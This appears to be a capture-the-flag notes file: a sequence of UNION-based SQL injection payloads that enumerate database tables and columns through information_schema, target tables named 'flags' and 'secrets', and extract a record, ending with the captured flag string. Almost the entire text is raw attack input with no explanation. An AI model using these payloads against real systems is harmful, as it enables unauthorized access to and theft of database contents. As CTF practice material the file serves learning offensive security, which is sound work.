```
1' UNION ALL SELECT 1,table_name,3 
1' UNION ALL SELECT table_name,2,3 from information_schema.tables where table_name=database() -- 

1' UNION ALL SELECT group_concat(table_name),2,3 from information_schema.tables where table_schema=database() -- 
1' UNION ALL SELECT group_concat(column_name),2,3 from information_schema.columns where table_name='flags' -- 
1' UNION ALL SELECT group_concat(column_name),2,3 from information_schema.columns where table_name='secrets' and table_schema=database() -- 

1' UNION SELECT description,2,4 from 'flags' --  
1' union select description,2,3 from flags -- 

NOVI{7h1s_flag_w@s_chuncky_right}

```
